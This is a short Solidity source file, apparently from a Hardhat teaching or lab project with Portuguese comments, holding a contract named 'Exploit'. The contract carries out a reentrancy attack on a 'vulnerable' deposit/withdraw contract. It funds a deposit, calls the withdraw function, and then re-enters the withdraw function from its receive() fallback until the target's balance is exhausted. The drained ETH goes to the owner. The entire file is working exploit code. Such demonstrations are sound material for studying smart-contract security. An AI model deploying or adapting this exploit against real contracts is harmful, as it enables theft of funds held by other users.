// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;

// Para poder usar console.log
import "hardhat/console.sol";

// Para poder imprimir como string
import '@openzeppelin/contracts/utils/Strings.sol';
import '@openzeppelin/contracts/access/Ownable.sol';

interface IVulneravel {
    function depositar() payable external;
    function resgatar() external;
}

contract Exploit is Ownable {
    using Strings for uint256;
    using Strings for address;

    IVulneravel internal vulneravel;

    constructor(address _enderecoVulneravel) {
        vulneravel = IVulneravel(_enderecoVulneravel);
        // console.log('Exploit: criado em %s', address(this));
    }

    function fundar() public onlyOwner payable {
        // Envia ETH para o contrato para garantir que passe no primeiro require()
        vulneravel.depositar{value: msg.value}();
    }

    function atacar() public onlyOwner {
        // console.log('atacar()');

        vulneravel.resgatar();

        // Transfere todo o saldo deste contrato para o dono
        uint256 quantia = address(this).balance;
        (bool os, ) = payable(owner()).call{value: quantia}('');
        require(os);

        // console.log('transferido %s para o dono %s', quantia, owner());
    }

    receive() external payable {
        // console.log(string.concat('receive(): recebeu %s wei de %s', msg.value, msg.sender));
        if (msg.sender == address(vulneravel) && address(vulneravel).balance >= msg.value) {
            vulneravel.resgatar();
        }
    }
}
